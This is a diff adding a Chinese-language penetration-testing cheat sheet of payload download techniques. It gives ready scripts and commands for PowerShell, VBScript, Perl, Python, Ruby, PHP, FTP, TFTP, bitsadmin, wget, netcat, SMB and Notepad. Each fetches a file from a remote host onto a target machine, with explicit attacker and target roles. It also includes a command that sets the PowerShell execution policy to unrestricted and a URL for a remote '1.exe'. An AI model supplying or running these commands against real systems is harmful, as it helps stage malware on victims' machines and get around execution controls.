@@ -1,0 +1,154 @@
+0x01 Powershell
+
+创建如下PSH脚本：
+
+    $p = New-Object System.Net.WebClient 
+    $p.DownloadFile("http://domain/file","C:%homepath%file") 
+
+执行：
+
+    PS C:> .test.ps1
+
+如果Powershell禁止执行了，使用如下命令：
+
+    C:>powershell set-executionpolicy unrestricted
+
+
+0x02 Visual Basic
+
+创建如下VBS脚本。
+
+    Set args = Wscript.Arguments
+    Url = "http://domain/file"
+    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+    dim bStrm: Set bStrm = createobject("Adodb.Stream")
+    xHttp.Open "GET", Url, False
+    xHttp.Send
+    with bStrm
+        .type = 1 '
+        .open
+        .write xHttp.responseBody
+        .savetofile " C:\%homepath%\file", 2 '
+    end with
+
+执行：
+
+    C:>cscript test.vbs
+
+
+0x03 Perl
+
+脚本如下:
+
+    #!/usr/bin/perl 
+    use LWP::Simple; 
+    getstore("http://domain/file", "file");
+
+执行：
+
+    root@kali:~# perl test.pl
+
+
+0x04 Python
+
+脚本如下：
+
+    #!/usr/bin/python 
+    import urllib2 
+    u = urllib2.urlopen('http://domain/file') 
+    localFile = open('local_file', 'w') 
+    localFile.write(u.read()) 
+    localFile.close()
+
+执行：
+
+    root@kali:~# python test.py
+
+
+0x05 Ruby
+
+脚本如下：
+
+    #!/usr/bin/ruby
+    require 'net/http'
+    Net::HTTP.start("www.domain.com") { |http|
+    r = http.get("/file")
+    open("save_location", "wb") { |file|
+    file.write(r.body)
+    }
+    }
+
+执行：
+
+    root@kali:~# ruby test.rb
+
+
+0x06 PHP
+
+脚本如下：
+
+    #!/usr/bin/php 
+    <?php $data = @file("http://example.com/file");
+    $lf = "local_file";         
+    $fh = fopen($lf, 'w');         
+    fwrite($fh, $data[0]);         
+    fclose($fh); 
+    ?>
+
+执行：
+
+    root@kali:~# php test.php
+
+
+0x07 FTP
+
+执行如下命令：
+
+    ftp 127.0.0.1 username password get file exit
+
+
+0x08 TFTP
+
+执行如下命令：
+
+    tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
+
+
+0x09 Bitsadmin
+
+执行如下命令：
+
+    bitsadmin /transfer n http://domain/file c:%homepath%file
+
+
+0x10 Wget
+
+执行如下命令：
+
+    wget http://example.com/file
+
+0x11 Netcat
+
+attacker执行如下命令：
+
+    cat file | nc -l 1234
+
+target执行：
+
+    nc host_ip 1234 > file
+
+
+0x12 Window 文件共享
+
+使用如下命令:
+
+    net use x: \127.0.0.1\share /user:example.comuserID myPassword
+
+
+0x13 记事本：
+
+        打开记事本
+        文件，打开
+        在文件名处填入下载地址
+
+	http://evi1cg.me/1.exe
